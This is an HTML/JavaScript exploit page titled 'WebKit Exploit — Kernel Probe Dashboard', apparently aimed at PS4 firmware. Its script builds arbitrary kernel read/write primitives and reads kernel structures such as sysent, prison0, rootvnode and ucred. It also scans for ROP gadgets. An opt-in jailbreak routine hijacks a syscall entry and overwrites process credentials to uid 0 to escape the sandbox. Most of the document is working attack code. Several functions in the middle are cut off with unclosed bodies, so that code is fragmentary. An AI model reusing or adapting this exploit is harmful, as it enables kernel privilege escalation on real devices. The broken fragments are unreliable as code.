<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>WebKit Exploit — Kernel Probe Dashboard</title>
<style>
  :root {
    --bg:        #0b0e13;
    --panel:     #12161f;
    --panel2:    #0f131a;
    --panel3:    #0a0d14;
    --border:    #232a38;
    --border2:   #1a1f2b;
    --text:      #c9d4e3;
    --dim:       #6b7a90;
    --dim2:      #4a5566;
    --pass:      #3ddc84;
    --fail:      #ff5c5c;
    --warn:      #ffb020;
    --info:      #8fa6c4;
    --accent:    #4aa3ff;
    --purple:    #b088ff;
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; }
  body {
    background: var(--bg);
    color: var(--text);
    font: 13px/1.45 'Courier New', ui-monospace, monospace;
    padding: 10px;
    height: 100vh;
    display: flex;
    flex-direction: column;
    gap: 8px;
    overflow: hidden;
  }

  /* ================= STATUS BAR ================= */
  #statusbar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    gap: 10px;
    flex-wrap: wrap;
    padding: 10px 12px;
    border: 1px solid var(--border);
    border-left: 6px solid var(--dim);
    border-radius: 6px;
    background: var(--panel);
    flex: 0 0 auto;
  }
  #statusbar.pending  { border-left-color: var(--dim); }
  #statusbar.running  { border-left-color: var(--accent); }
  #statusbar.pass     { border-left-color: var(--pass); background: #0e1a14; }
  #statusbar.fail     { border-left-color: var(--fail); background: #1a0e0e; }
  #statusbar.halted   { border-left-color: var(--warn); background: #1a160a; }

  .status-left { display: flex; align-items: center; gap: 10px; min-width: 0; }
  .dot {
    width: 12px; height: 12px; border-radius: 50%;
    background: var(--dim); flex: 0 0 auto;
  }
  #statusbar.running .dot { background: var(--accent); animation: pulse 1.1s infinite; }
  #statusbar.pass    .dot { background: var(--pass); box-shadow: 0 0 10px var(--pass); }
  #statusbar.fail    .dot { background: var(--fail); box-shadow: 0 0 10px var(--fail); }
  #statusbar.halted  .dot { background: var(--warn); box-shadow: 0 0 10px var(--warn); }
  @keyframes pulse {
    0%   { box-shadow: 0 0 0 0 rgba(74,163,255,.7); }
    70%  { box-shadow: 0 0 0 8px rgba(74,163,255,0); }
    100% { box-shadow: 0 0 0 0 rgba(74,163,255,0); }
  }
  #statusText {
    font-size: 15px; font-weight: bold; letter-spacing: .5px;
    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
  }
  #statusbar.pass #statusText { color: var(--pass); }
  #statusbar.fail #statusText { color: var(--fail); }
  #statusbar.running #statusText { color: var(--accent); }
  #statusbar.halted #statusText { color: var(--warn); }
  #statusSub { color: var(--dim); font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }

  .status-right { display: flex; gap: 6px; flex-wrap: wrap; }
  .chip {
    padding: 3px 8px; border-radius: 10px; font-size: 11px; font-weight: bold;
    border: 1px solid var(--border); background: var(--panel2); color: var(--dim);
  }
  .chip.pass { color: var(--pass); border-color: #1f4a35; }
  .chip.fail { color: var(--fail); border-color: #4a1f1f; }
  .chip.warn { color: var(--warn); border-color: #4a3a1f; }

  /* ================= TOOLBAR ================= */
  #toolbar {
    display: flex; align-items: center; gap: 8px; flex-wrap: wrap;
    padding: 6px 8px;
    border: 1px solid var(--border);
    border-radius: 6px;
    background: var(--panel2);
    flex: 0 0 auto;
  }
  button {
    font: inherit; font-size: 12px;
    padding: 5px 10px;
    color: var(--text);
    background: #1b2230;
    border: 1px solid var(--border);
    border-radius: 4px;
    cursor: pointer;
  }
  button:hover { background: #253044; border-color: #35425c; }
  button:active { transform: translateY(1px); }
  button.primary { border-color: #1f4a7a; color: var(--accent); }
  #toolbar label { color: var(--dim); font-size: 11px; display: flex; align-items: center; gap: 4px; cursor: pointer; }
  #toolbar .spacer { flex: 1 1 auto; }
  #toolbar .meta { color: var(--dim); font-size: 11px; }

  /* ================= DASHBOARD ================= */
  #dashboard {
    flex: 1 1 auto;
    min-height: 0;
    overflow: auto;
    display: grid;
    grid-template-columns: repeat(3, minmax(0, 1fr));
    gap: 10px;
    align-content: start;
    padding-right: 2px;
  }
  @media (max-width: 900px) {
    #dashboard { grid-template-columns: repeat(2, minmax(0, 1fr)); }
  }
  @media (max-width: 620px) {
    #dashboard { grid-template-columns: 1fr; }
  }

  .card {
    background: var(--panel);
    border: 1px solid var(--border);
    border-radius: 8px;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    transition: border-color .2s, box-shadow .2s;
  }
  .card.wide { grid-column: 1 / -1; }
  .card.ok   { border-color: #1f4a35; box-shadow: 0 0 0 1px #1f4a3550 inset; }
  .card.bad  { border-color: #4a1f1f; }
  .card.warn { border-color: #4a3a1f; }

  .card-header {
    padding: 8px 12px;
    background: var(--panel2);
    border-bottom: 1px solid var(--border);
    font-size: 11px;
    letter-spacing: 1.2px;
    color: var(--dim);
    text-transform: uppercase;
    font-weight: bold;
    display: flex;
    justify-content: space-between;
    align-items: center;
    gap: 8px;
    flex: 0 0 auto;
  }
  .card-header .title { display: flex; align-items: center; gap: 8px; }
  .card-header .icon { color: var(--accent); font-size: 13px; line-height: 1; }
  .card.ok   .card-header .icon { color: var(--pass); }
  .card.bad  .card-header .icon { color: var(--fail); }
  .card.warn .card-header .icon { color: var(--warn); }

  .badge {
    padding: 2px 8px;
    border-radius: 9px;
    font-size: 10px;
    font-weight: bold;
    letter-spacing: .5px;
    background: #1a1f2b;
    color: var(--dim);
    border: 1px solid var(--border2);
  }
  .badge.ok   { color: var(--pass); background: #0e1a14; border-color: #1f4a35; }
  .badge.bad  { color: var(--fail); background: #1a0e0e; border-color: #4a1f1f; }
  .badge.warn { color: var(--warn); background: #1a160a; border-color: #4a3a1f; }
  .badge.run  { color: var(--accent); background: #0c1520; border-color: #1f4a7a; animation: pulse 1.1s infinite; }

  .card-body {
    padding: 4px 0 6px;
    flex: 1 1 auto;
  }

  .row {
    display: flex;
    justify-content: space-between;
    gap: 12px;
    padding: 4px 12px;
    font-size: 12px;
    border-bottom: 1px solid #0a0d12;
    align-items: baseline;
  }
  .row:last-child { border-bottom: none; }
  .row .k { color: var(--dim); flex: 0 0 auto; white-space: nowrap; }
  .row .v {
    color: var(--text);
    text-align: right;
    word-break: break-all;
    font-family: 'Courier New', monospace;
    min-width: 0;
  }
  .row.ok   .v { color: var(--pass); }
  .row.bad  .v { color: var(--fail); }
  .row.warn .v { color: var(--warn); }
  .row.dim  .v { color: var(--dim2); font-style: italic; }

  /* ================= GADGET LIST ================= */
  .gadget-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
    gap: 10px;
    padding: 8px 10px;
  }
  .gadget-group {
    background: var(--panel3);
    border: 1px solid var(--border2);
    border-radius: 6px;
    padding: 8px 10px;
  }
  .gadget-group-title {
    font-size: 11px;
    letter-spacing: 1px;
    color: var(--purple);
    text-transform: uppercase;
    font-weight: bold;
    margin-bottom: 6px;
    display: flex;
    justify-content: space-between;
    gap: 6px;
  }
  .gadget-group-title .count { color: var(--dim); font-weight: normal; }
  .gadget-list { display: flex; flex-direction: column; gap: 2px; }
  .gadget {
    display: flex;
    justify-content: space-between;
    gap: 8px;
    padding: 2px 0;
    font-size: 11.5px;
    border-bottom: 1px dashed #141922;
  }
  .gadget:last-child { border-bottom: none; }
  .gadget-name { color: var(--text); }
  .gadget-addr { color: var(--accent); font-family: 'Courier New', monospace; }
  .gadget.empty { color: var(--dim2); font-style: italic; font-size: 11px; }

  /* ================= CONSOLE ================= */
  #consolePanel {
    flex: 0 0 200px;
    min-height: 0;
    border: 1px solid var(--border);
    border-radius: 6px;
    background: #05070a;
    overflow: hidden;
    display: flex;
    flex-direction: column;
    transition: flex-basis .15s;
  }
  #consolePanel.collapsed { flex-basis: 30px; }
  #consoleHead {
    padding: 6px 10px;
    background: var(--panel);
    border-bottom: 1px solid var(--border);
    color: var(--dim);
    font-size: 11px;
    letter-spacing: 1px;
    display: flex; justify-content: space-between; gap: 8px;
    cursor: pointer;
    user-select: none;
    flex: 0 0 auto;
  }
  #consoleHead:hover { color: var(--text); }
  #out {
    flex: 1 1 auto;
    overflow: auto;
    padding: 6px 0;
    font-size: 12px;
    line-height: 1.4;
    -webkit-overflow-scrolling: touch;
  }
  #consolePanel.collapsed #out { display: none; }
  .logline {
    display: flex;
    gap: 8px;
    padding: 1px 10px;
    border-left: 3px solid transparent;
    white-space: pre-wrap;
    word-break: break-word;
  }
  .logline .time { color: #3f4c60; flex: 0 0 auto; }
  .logline .msg  { flex: 1 1 auto; }
  .logline.info  { color: var(--info);  border-left-color: #1c2433; }
  .logline.pass  { color: var(--pass);  border-left-color: var(--pass); font-weight: bold; background: #0a1710; }
  .logline.fail  { color: var(--fail);  border-left-color: var(--fail); font-weight: bold; background: #170a0a; }
  .logline.warn  { color: var(--warn);  border-left-color: var(--warn); background: #17120a; }
  .logline.debug { color: #5a6a80; border-left-color: #1c2433; }

  #out::-webkit-scrollbar,
  #dashboard::-webkit-scrollbar { width: 10px; height: 10px; }
  #out::-webkit-scrollbar-track,
  #dashboard::-webkit-scrollbar-track { background: #0a0d12; }
  #out::-webkit-scrollbar-thumb,
  #dashboard::-webkit-scrollbar-thumb { background: #263043; border-radius: 5px; }

  @media (max-width: 640px) {
    .logline { font-size: 11px; }
    #statusText { font-size: 13px; }
    .card-header { font-size: 10px; }
  }
</style>
</head>
<body>

<!-- ================= STATUS BAR ================= -->
<div id="statusbar" class="pending">
  <div class="status-left">
    <span class="dot"></span>
    <div style="min-width:0">
      <div id="statusText">INITIALIZING…</div>
      <div id="statusSub">waiting for boot</div>
    </div>
  </div>
  <div class="status-right">
    <span class="chip pass" id="chipPass">PASS 0</span>
    <span class="chip fail" id="chipFail">FAIL 0</span>
    <span class="chip warn" id="chipWarn">WARN 0</span>
  </div>
</div>

<!-- ================= TOOLBAR ================= -->
<div id="toolbar">
  <button id="btnCopy" class="primary">Copy report</button>
  <button id="btnClear">Clear log</button>
  <button id="btnToggleConsole">Toggle console</button>
  <label><input type="checkbox" id="chkAutoScroll" checked> auto-scroll</label>
  <span class="spacer"></span>
  <span class="meta" id="toolbarMeta">rev —</span>
</div>

<!-- ================= DASHBOARD ================= -->
<div id="dashboard"></div>

<!-- ================= CONSOLE ================= -->
<div id="consolePanel">
  <div id="consoleHead" title="click to collapse/expand">
    <span>▸ CONSOLE OUTPUT</span>
    <span id="consoleCount">0 lines</span>
  </div>
  <div id="out"></div>
</div>

<script>
"use strict";

/* ============================================================
 *  LOGGER
 * ============================================================ */
var LOG = {
    lines: [],
    counts: { pass: 0, fail: 0, warn: 0, info: 0 },
    startTime: Date.now(),
    maxLines: 8000,
    autoScroll: true,
    status: "pending",
    statusText: "INITIALIZING…",
    statusSub: "waiting for boot"
};

function pad(n, w) { n = String(n); while (n.length < (w || 2)) n = "0" + n; return n; }

function fmtTime(ms) {
    var d = new Date(ms);
    return pad(d.getHours()) + ":" + pad(d.getMinutes()) + ":" + pad(d.getSeconds()) + "." + pad(d.getMilliseconds(), 3);
}

function classify(tag, extra) {
    var t = (String(tag) + " " + (extra === undefined ? "" : String(extra))).toUpperCase();
    if (t.indexOf("FAILED")   !== -1) return "fail";
    if (t.indexOf("GIVE-UP")  !== -1) return "fail";
    if (t.indexOf("FAIL")     !== -1) return "fail";
    if (t.indexOf("MISMATCH") !== -1) return "fail";
    if (t.indexOf("THREW")    !== -1) return "fail";
    if (t.indexOf("ERROR")    !== -1) return "fail";
    if (t.indexOf("PASS")     !== -1) return "pass";
    if (t.indexOf("COMPLETE") !== -1) return "pass";
    if (t.indexOf("SUCCESS")  !== -1) return "pass";
    if (t.indexOf("RETAINED") !== -1) return "pass";
    if (t.indexOf("HALTED")   !== -1) return "warn";
    if (t.indexOf("MISS")     !== -1) return "warn";
    if (t.indexOf("RETRY")    !== -1) return "warn";
    if (t.indexOf("NO-RESULT")!== -1) return "warn";
    if (t.indexOf("NONE")     !== -1) return "warn";
    return "info";
}

function renderLine(entry) {
    try {
        var el = document.getElementById("out");
        if (!el) return;
        var div = document.createElement("div");
        div.className = "logline " + entry.level;
        var t = document.createElement("span");
        t.className = "time";
        t.textContent = fmtTime(entry.t);
        var m = document.createElement("span");
        m.className = "msg";
        m.textContent = entry.text;
        div.appendChild(t);
        div.appendChild(m);
        el.appendChild(div);
        if (LOG.autoScroll) el.scrollTop = el.scrollHeight;
    } catch (_) {}
}

function updateChips() {
    try {
        document.getElementById("chipPass").textContent = "PASS " + LOG.counts.pass;
        document.getElementById("chipFail").textContent = "FAIL " + LOG.counts.fail;
        document.getElementById("chipWarn").textContent = "WARN " + LOG.counts.warn;
        document.getElementById("consoleCount").textContent = LOG.lines.length + " lines";
    } catch (_) {}
}

function logLine(text, level) {
    level = level || "info";
    var entry = { t: Date.now(), text: text, level: level };
    LOG.lines.push(entry);
    LOG.counts[level] = (LOG.counts[level] || 0) + 1;
    if (LOG.lines.length > LOG.maxLines) LOG.lines.shift();
    renderLine(entry);
    updateChips();
}

function setStatus(state, text, sub) {
    LOG.status = state;
    LOG.statusText = text;
    LOG.statusSub = sub || "";
    try {
        var bar = document.getElementById("statusbar");
        bar.className = state;
        document.getElementById("statusText").textContent = text;
        document.getElementById("statusSub").textContent = sub || "";
    } catch (_) {}
}

function updateStatusFromMark(tag, extra) {
    var t = String(tag).toUpperCase();
    var e = extra === undefined ? "" : String(extra);
    if (t === "BOOT") {
        setStatus("running", "RUNNING", e);
    } else if (t.indexOf("KERNEL PROBE START") !== -1) {
        setStatus("running", "PROBING KERNEL…", e);
    } else if (t.indexOf("KERNEL PROBE COMPLETE") !== -1) {
        setStatus("halted", "PROBE COMPLETE", "gadgets + kernel info on dashboard");
    } else if (t.indexOf("PS4 JAILBREAK START") !== -1) {
        setStatus("running", "JAILBREAKING…", e);
    } else if (t.indexOf("HALTED-BEFORE-JAILBREAK") !== -1) {
        setStatus("halted", "R/W PASS — HALTED", "jailbreak disabled (add ?jb=1 to continue)");
    } else if (t.indexOf("GENUINE-UB-RW-PASS") !== -1) {
        setStatus("pass", "ARBITRARY R/W — PASS", e);
    } else if (t.indexOf("JAILBREAK COMPLETE") !== -1) {
        setStatus("pass", "JAILBREAK COMPLETE — PASS", e);
    } else if (t.indexOf("FAILED-TERMINAL") === 0) {
        setStatus("fail", "FAILED — " + e, "terminal, no retry");
    } else if (t.indexOf("JAILBREAK-ERROR") === 0) {
        setStatus("fail", "JAILBREAK ERROR — FAIL", e);
    } else if (t.indexOf("PROBE-ERROR") === 0) {
        setStatus("fail", "PROBE ERROR — FAIL", e);
    }
}

/* ============================================================
 *  DASHBOARD DEFINITION
 * ============================================================ */
var CARDS = [
    { id: "fw", title: "Firmware", icon: "▣", rows: [
        { key: "label",       label: "FW Label",      placeholder: "detecting…" },
        { key: "ua",          label: "User Agent",    placeholder: "—" },
        { key: "rev",         label: "Revision",      placeholder: "—" },
        { key: "off-evf",     label: "EVF offset",    placeholder: "—" },
        { key: "off-prison0", label: "prison0 offset",placeholder: "—" },
        { key: "off-root",    label: "rootvnode off", placeholder: "—" },
        { key: "off-sysent",  label: "sysent offset", placeholder: "—" },
        { key: "off-jmp",     label: "jmp offset",    placeholder: "—" }
    ]},
    { id: "rw", title: "R/W Primitive", icon: "◈", rows: [
        { key: "state",   label: "State",           placeholder: "waiting" },
        { key: "read",    label: "Arbitrary read",  placeholder: "—" },
        { key: "write",   label: "Arbitrary write", placeholder: "—" },
        { key: "restore", label: "State restore",   placeholder: "—" },
        { key: "host",    label: "Host address",    placeholder: "—" },
        { key: "fake",    label: "Fake cell",       placeholder: "—" },
        { key: "target",  label: "Target cell",     placeholder: "—" },
        { key: "sid",     label: "SID",             placeholder: "—" },
        { key: "rwhdr",   label: "RW header",       placeholder: "—" },
        { key: "tghdr",   label: "Target header",   placeholder: "—" }
    ]},
    { id: "kbase", title: "Kernel Base", icon: "⌂", rows: [
        { key: "base",  label: "KBASE",    placeholder: "0xffffffff80000000" },
        { key: "q0",    label: "k[0x00]",  placeholder: "—" },
        { key: "q1",    label: "k[0x08]",  placeholder: "—" },
        { key: "q2",    label: "k[0x10]",  placeholder: "—" },
        { key: "q3",    label: "k[0x18]",  placeholder: "—" }
    ]},
    { id: "evf", title: "EVF / proc0", icon: "◆", rows: [
        { key: "addr",    label: "EVF address", placeholder: "—" },
        { key: "proc0",   label: "proc0 ptr",   placeholder: "—" },
        { key: "pid",     label: "p_pid",       placeholder: "—" },
        { key: "ucred",   label: "p_ucred",     placeholder: "—" }
    ]},
    { id: "prison", title: "prison0", icon: "▤", rows: [
        { key: "addr",  label: "Address", placeholder: "—" },
        { key: "value", label: "Value",   placeholder: "—" }
    ]},
    { id: "root", title: "rootvnode", icon: "◉", rows: [
        { key: "addr",  label: "Address", placeholder: "—" },
        { key: "value", label: "Value",   placeholder: "—" }
    ]},
    { id: "sysent", title: "sysent[661]", icon: "⚙", rows: [
        { key: "addr",   label: "Address",  placeholder: "—" },
        { key: "narg",   label: "sy_narg",  placeholder: "—" },
        { key: "call",   label: "sy_call",  placeholder: "—" },
        { key: "thrcnt", label: "sy_thrcnt",placeholder: "—" },
        { key: "jmp",    label: "jmp gadget", placeholder: "—" }
    ]},
    { id: "ucred", title: "Credential Chain", icon: "◆", rows: [
        { key: "addr",   label: "ucred addr", placeholder: "—" },
        { key: "uid",    label: "uid",        placeholder: "—" },
        { key: "gid",    label: "gid",        placeholder: "—" },
        { key: "prison", label: "cr_prison",  placeholder: "—" },
        { key: "ngroups",label: "ngroups",    placeholder: "—" }
    ]},
    { id: "gadgets", title: "Gadgets & ROP", icon: "⟐", wide: true, gadgets: true }
];

/* ============================================================
 *  DASHBOARD BUILD + UPDATE HELPERS
 * ============================================================ */
function buildDashboard() {
    var grid = document.getElementById("dashboard");
    grid.innerHTML = "";
    CARDS.forEach(function(card) {
        var el = document.createElement("section");
        el.className = "card" + (card.wide ? " wide" : "");
        el.id = "card-" + card.id;

        var hdr = document.createElement("div");
        hdr.className = "card-header";
        var title = document.createElement("span");
        title.className = "title";
        title.innerHTML = '<span class="icon">' + (card.icon || "▪") + '</span>' + card.title;
        var badge = document.createElement("span");
        badge.className = "badge";
        badge.id = "badge-" + card.id;
        badge.textContent = "WAIT";
        hdr.appendChild(title);
        hdr.appendChild(badge);
        el.appendChild(hdr);

        var body = document.createElement("div");
        body.className = "card-body";
        body.id = "body-" + card.id;
        el.appendChild(body);

        if (card.gadgets) {
            body.innerHTML = '<div class="gadget-grid" id="gadget-grid">' +
                '<div class="gadget-group"><div class="gadget-group-title">Waiting for R/W</div>' +
                '<div class="gadget-list"><div class="gadget empty">probe has not run yet</div></div></div></div>';
        } else {
            card.rows.forEach(function(row) {
                var r = document.createElement("div");
                r.className = "row";
                r.id = "row-" + card.id + "-" + row.key;
                var k = document.createElement("span");
                k.className = "k";
                k.textContent = row.label;
                var v = document.createElement("span");
                v.className = "v";
                v.textContent = row.placeholder || "—";
                r.appendChild(k);
                r.appendChild(v);
                body.appendChild(r);
            });
        }
        grid.appendChild(el);
    });
}

function setRow(cardId, rowKey, value, level) {

function read64(addr) {

    for (var i = 0; i < 8; i++) val |= BigInt(globalFakeArray[i]) << BigInt(i*8);

function write64(addr, value) {
    if (!globalFakeArray) return;
    var oldVec = [];
    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];

    var low = Number(BigInt(addr) & 0xFFFFFFFFn);
    var high = Number((BigInt(addr) >> 32n) & 0xFFFFFFFFn);
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >> (i*8)) & 0xFF;
    for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >> (i*8)) & 0xFF;

    var v = BigInt(value);
    for (var i = 0; i < 8; i++) globalFakeArray[i] = Number((v >> BigInt(i*8)) & 0xFFn);

function readBytes(addr, count) {
    var out = new Uint8Array(count);
    if (!globalFakeArray) return out;

    var oldVec = new Uint8Array(8);
    for (var i = 0; i < 8; i++) oldVec[i] = globalFakeArray[0x10 + i];

    var written = 0;

        var curAddr = BigInt(addr) + BigInt(written);
        var low  = Number(curAddr & 0xFFFFFFFFn);
        var high = Number((curAddr >> 32n) & 0xFFFFFFFFn);
        for (var i = 0; i < 4; i++) globalFakeArray[0x10 + i] = (low >>> (i * 8)) & 0xFF;
        for (var i = 0; i < 4; i++) globalFakeArray[0x10 + 4 + i] = (high >>> (i * 8)) & 0xFF;

function scanGadgetsInWindow(startAddr, windowBytes) {
    var found = 0;
    try {
        var buf = readBytes(startAddr, windowBytes);
        for (var g = 0; g < GADGETS.length; g++) {
            var gd = GADGETS[g];
            var blen = gd.bytes.length;
            for (var i = 0; i <= buf.length - blen; i++) {
                var ok = true;
                for (var j = 0; j < blen; j++) {
                    if (buf[i + j] !== gd.bytes[j]) { ok = false; break; }

                if (ok) {
                    var addr = BigInt(startAddr) + BigInt(i);
                    addGadgetHit(gd.cat, gd.name, hex(addr));
                    found++;
                    break;

        }
    } catch (err) {
        mark("SCAN-ERROR", hex(startAddr) + ":" + (err && err.message ? err.message.slice(0, 60) : "?"));
    }
    return found;
}

            setRow("kbase", "q3", hex(h3));
            mark("KBASE-HDR", "q0=" + hex(h0) + " q1=" + hex(h1) + " q2=" + hex(h2) + " q3=" + hex(h3));
        } catch (_) {}

        var evf       = fwOffsets.evf;
        var prison0   = fwOffsets.prison0;
        var rootvnode = fwOffsets.rootvnode;
        var sysent    = fwOffsets.sysent;
        var jmp       = fwOffsets.jmp;

        var evfAddr = kbase + BigInt(evf);
        var evfVal  = read64(evfAddr);
        setRow("evf", "addr",  hex(evfAddr));
        setRow("evf", "proc0", hex(evfVal));
        setBadge("evf", "OK", "ok");
        setCardState("evf", "ok");
        mark("EVF", "addr=" + hex(evfAddr) + "-proc0=" + hex(evfVal));

        var prisonAddr = kbase + BigInt(prison0);
        var prisonVal  = read64(prisonAddr);
        setRow("prison", "addr",  hex(prisonAddr));
        setRow("prison", "value", hex(prisonVal));
        setBadge("prison", "OK", "ok");
        setCardState("prison", "ok");
        mark("PRISON0", "addr=" + hex(prisonAddr) + "-value=" + hex(prisonVal));

        var rootAddr = kbase + BigInt(rootvnode);
        var rootVal  = read64(rootAddr);
        setRow("root", "addr",  hex(rootAddr));
        setRow("root", "value", hex(rootVal));
        setBadge("root", "OK", "ok");
        setCardState("root", "ok");
        mark("ROOTVNODE", "addr=" + hex(rootAddr) + "-value=" + hex(rootVal));

        var sysentAddr = kbase + BigInt(sysent);
        var sy_narg    = read64(sysentAddr);
        var sy_call    = read64(sysentAddr + 8n);
        var sy_thrcnt  = read64(sysentAddr + 0x2Cn);
        setRow("sysent", "addr",   hex(sysentAddr));
        setRow("sysent", "narg",   hex(sy_narg));
        setRow("sysent", "call",   hex(sy_call));
        setRow("sysent", "thrcnt", hex(sy_thrcnt));
        setBadge("sysent", "OK", "ok");
        setCardState("sysent", "ok");
        mark("SYSENT-661", "addr=" + hex(sysentAddr));
        mark("SYSENT-661-NARG", hex(sy_narg));
        mark("SYSENT-661-CALL", hex(sy_call));
        mark("SYSENT-661-THRCNT", hex(sy_thrcnt));

        var jmpAddr  = kbase + BigInt(jmp);
        var jmpBytes = read64(jmpAddr);
        setRow("sysent", "jmp", hex(jmpAddr) + "  /  " + hex(jmpBytes));
        mark("JMP-RSI-KNOWN", "addr=" + hex(jmpAddr) + "-bytes=" + hex(jmpBytes));

        if (evfVal > 0xffff000000000000n && evfVal < 0xffffffffffffffffn) {
            try {
                var pid   = read64(evfVal + 0xBCn);
                var ucred = read64(evfVal + 0x40n);
                setRow("evf", "pid",   hex(pid));
                setRow("evf", "ucred", hex(ucred));
                mark("PROC0-PID",   hex(pid));
                mark("PROC0-UCRED", hex(ucred));

                if (ucred > 0xffff000000000000n && ucred < 0xffffffffffffffffn) {
                    var uid     = read64(ucred + 0x04n);
                    var gid     = read64(ucred + 0x08n);
                    var prison  = read64(ucred + 0x30n);
                    var ngroups = read64(ucred + 0x10n);
                    setRow("ucred", "addr",    hex(ucred));
                    setRow("ucred", "uid",     hex(uid));
                    setRow("ucred", "gid",     hex(gid));
                    setRow("ucred", "prison",  hex(prison));
                    setRow("ucred", "ngroups", hex(ngroups));
                    setBadge("ucred", "OK", "ok");
                    setCardState("ucred", "ok");
                    mark("PROC0-UCRED-VALUES", "uid=" + hex(uid) + "-gid=" + hex(gid) + "-prison=" + hex(prison) + "-ngroups=" + hex(ngroups));
                } else {
                    setBadge("ucred", "INVALID", "warn");
                    setCardState("ucred", "warn");
                }
            } catch (e) {
                setBadge("ucred", "ERR", "bad");
                setCardState("ucred", "bad");
                mark("PROC0-CHAIN-ERR", String(e && e.message).slice(0, 60));
            }
        } else {
            setBadge("ucred", "NO PROC", "warn");
            setCardState("ucred", "warn");
        }

        var w1Base = (sy_call & ~0xFFFn) - 0x800n;
        if (w1Base < kbase) w1Base = kbase;
        dumpWindow("SCAN-SYCALL", w1Base, 0x1000);

        dumpWindow("SCAN-EARLY", kbase + 0x1000n, 0x1000);

        dumpWindow("SCAN-JMP", (jmpAddr & ~0xFFn), 0x400);

        dumpWindow("SCAN-ROOT", (rootAddr & ~0xFFFn), 0x800);

        mark("ROP-SUMMARY",
            "kb=" + hex(kbase) +
            "-sysent=" + hex(sysentAddr) +
            "-jmp=" + hex(jmpAddr) +
            "-prison0=" + hex(prisonVal) +
            "-rootvnode=" + hex(rootVal));

        mark("===== KERNEL PROBE COMPLETE =====", "fw=" + FW_LABEL);
        setStatus("halted", "PROBE COMPLETE", "gadgets + kernel info on dashboard");

    } catch (err) {
        mark("PROBE-ERROR", (err && err.name) + ":" + String(err && err.message).slice(0, 120));
    }
}

/* ============================================================
 *  PS4 JAILBREAK (opt-in via ?jb=1)
 * ============================================================ */
function runJailbreak() {
    mark("===== PS4 JAILBREAK START =====", "fw=" + FW_LABEL);

    try {
        var evf = fwOffsets.evf;
        var prison0 = fwOffsets.prison0;
        var rootvnode = fwOffsets.rootvnode;
        var sysent = fwOffsets.sysent;
        var jmp = fwOffsets.jmp;

        var kbase = 0xffffffff80000000n;
        mark("KERNEL-BASE", hex(kbase));

        var sysent_661 = kbase + BigInt(sysent);
        var jmp_rsi = kbase + BigInt(jmp);
        mark("SYSENT-661", hex(sysent_661));
        mark("JMP-RSI", hex(jmp_rsi));

        var sy_narg = Number(read64(sysent_661) & 0xFFFFFFFFn);
        var sy_call = read64(sysent_661 + 8n);
        var sy_thrcnt = Number(read64(sysent_661 + 0x2Cn) & 0xFFFFFFFFn);

        write64(sysent_661, 2n);
        write64(sysent_661 + 8n, jmp_rsi);
        write64(sysent_661 + 0x2Cn, 1n);
        mark("SYSENT-HIJACKED", "success");

        var proc = kbase + BigInt(evf);
        var sandboxEscaped = false;
        var verifyUid = -1n;
        var verifyGid = -1n;
        var verifyPrison = -1n;
        var dbgMode = Q.get("dbg") === "1";

        function patchAndVerifyUcred(ucred, prisonVal) {
            write64(ucred + 0x04n, 0n);
            write64(ucred + 0x08n, 0n);
            write64(ucred + 0x0Cn, 0n);
            write64(ucred + 0x10n, 1n);
            write64(ucred + 0x30n, prisonVal);
            verifyUid = read64(ucred + 0x04n);
            verifyGid = read64(ucred + 0x08n);
            verifyPrison = read64(ucred + 0x30n);
            return verifyUid === 0n && verifyGid === 0n && verifyPrison === prisonVal;
        }

        var prisonVal = read64(kbase + BigInt(prison0));
        var hits = 0;
        for (var i = 0; i < 0x4000; i += 8) {
            try {
                var candidate = read64(proc + BigInt(i));
                if ((candidate & 0xFFFFFFFFn) === 0x726f7272n) {
                    hits++;
                    var ucred = read64(proc + BigInt(i - 0x40));
                    if (ucred > 0n && ucred < 0xffffffffffffn) {
                        if (dbgMode) mark("SCAN-HIT", "marker-off=0x" + i.toString(16) + "-ucred=" + hex(ucred));
                        if (patchAndVerifyUcred(ucred, prisonVal)) {
                            sandboxEscaped = true;
                            mark("SANDBOX-ESCAPE", "success");
                            mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                        }
                        break;
                    }
                }
            } catch(e) {}
        }
        if (!sandboxEscaped && hits > 0) mark("SANDBOX-ESCAPE", "marker-hits=" + hits + "-ucred-not-found");

        if (!sandboxEscaped) {
            var sigStart = proc - 0x4000n;
            var sigEnd = proc + 0x4000n;
            var sigFound = 0n;
            for (var s = sigStart; s < sigEnd && !sandboxEscaped; s += 8n) {
                try {
                    var ref = Number(read64(s) & 0xFFFFFFFFn);
                    if (ref < 1 || ref > 0x200) continue;
                    var ngroups = Number(read64(s + 0x10n) & 0xFFFFFFFFn);
                    if (ngroups < 1 || ngroups > 0x80) continue;
                    var pr = read64(s + 0x30n);
                    if (pr !== prisonVal) continue;
                    if (dbgMode) mark("UCRED-SIG-CANDIDATE", hex(s) + "-ref=" + ref + "-groups=" + ngroups);
                    if (patchAndVerifyUcred(s, prisonVal)) {
                        sandboxEscaped = true;
                        sigFound = s;
                        mark("UCRED-SIG-FOUND", hex(s));
                        mark("SANDBOX-ESCAPE", "success");
                        mark("VERIFY-UID", "uid=" + verifyUid + "-gid=" + verifyGid + "-prison-matches=true");
                    }
                } catch(e) {}
            }
            if (!sandboxEscaped) {
                mark("SANDBOX-ESCAPE", "FAILED-not-found");
            }
        }

        var root = read64(kbase + BigInt(rootvnode));
        var rootVerified = false;
        if (root > 0n && root < 0xffffffffffffn) {
            var fd = read64(proc + BigInt(0x48));
            write64(fd + 0x10n, root);
            write64(fd + 0x18n, root);
            var fdCheck = read64(fd + 0x10n);
            rootVerified = fdCheck === root;
            mark("ROOT-VNODE-SET", rootVerified ? "success" : "mismatch");
            mark("VERIFY-ROOTVNODE", "fd=" + hex(fd) + "-readback=" + (fdCheck === root));
        } else {
            mark("ROOT-VNODE-SET", "FAILED-invalid-root");
        }

        write64(sysent_661, BigInt(sy_narg));
